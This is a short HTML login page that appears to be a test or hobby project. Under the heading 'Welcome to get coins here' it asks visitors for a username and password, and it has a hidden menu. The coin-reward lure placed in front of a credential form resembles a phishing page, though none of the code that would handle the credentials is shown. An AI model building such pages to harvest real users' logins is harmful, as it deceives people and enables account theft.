<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test - Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <h1>Welcome to get coins here</h1>
        <p class="welcome-text">Please enter your credentials for your account to continue</p>
        <form id="loginForm" onsubmit="login(event)">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-button">Login</button>
        </form>
        <p class="footer-text">Powered by rayla with conami © 2024</p>
    </div>

    <!-- زر القائمة -->
    <div class="menu-icon" onclick="toggleMenu()">
        ☰
    </div>

    <!-- القائمة المخفية -->
    <div class="menu-list" id="menuList">
        <a href="#" onclick="verifyCode()">wait son</a>
    </div>

    <script src="script.js"></script>
</body>
</html>
